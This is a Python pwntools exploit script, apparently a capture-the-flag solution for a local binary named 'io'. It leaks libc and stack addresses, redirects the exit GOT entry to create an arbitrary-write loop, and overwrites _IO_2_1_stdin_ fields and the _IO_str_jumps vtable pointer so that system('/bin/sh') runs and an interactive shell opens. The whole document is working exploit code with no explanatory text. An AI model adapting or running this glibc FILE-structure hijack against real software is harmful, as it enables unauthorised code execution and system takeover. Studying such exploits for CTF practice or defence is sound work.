#!/usr/bin/env python
from pwn import *
from FILE import *

context.arch = 'amd64'
#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 1
if local:
    p = process('./io')
    elf = ELF('./io')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    pass

# leak libc & stack
def leak(addr):
    p.recvuntil('See something?>>>')
    p.send(p64(addr))
    p.recvuntil('Something you got:')
    return int(p.recvuntil('\n')[2:-1], 16)

libc_base = leak(elf.got['puts']) - libc.sym['puts']
info('libc_base = ' + hex(libc_base))
environ = libc_base + libc.sym['environ']
stack = leak(environ)
info('stack = ' + hex(stack))

# create arbitrary write loop
bss_buf = 0x601100
loop_addr = 0x000000000040075C
p.sendafter('Now you can hide something!>>>', p64(elf.got['exit']))
p.sendafter('>>>', p64(loop_addr).ljust(0x30, '\x00'))
real_exit = libc_base + libc.sym['exit']
io_stdin = libc_base + libc.sym['_IO_2_1_stdin_']
#bin_sh_addr = libc_base + next(libc.search('/bin/sh\x00'))
#info('bin_sh_addr = ' + hex(bin_sh_addr))
bin_sh_addr = bss_buf
system = libc_base + libc.sym['system']
io_str_jumps = libc_base + 0x3c37a0

def write(addr, val):
    p.sendafter('Now you can hide something!>>>', p64(addr))
    p.sendafter('>>>', val.ljust(0x30, '\x00'))

write(io_stdin, p64(0))
write(io_stdin + 0x20, p64(0))
write(io_stdin + 0x28, p64(0x7fffffffffffffff))
write(io_stdin + 0x40, p64((bin_sh_addr - 100) / 2))
# write "/bin/sh\x00"
write(bss_buf, '/bin/sh\x00')
write(io_stdin + 0xe0, p64(system))
write(io_stdin + 0xd8, p64(io_str_jumps))
write(elf.got['exit'], p64(real_exit))

#gdb.attach(p)

p.interactive()

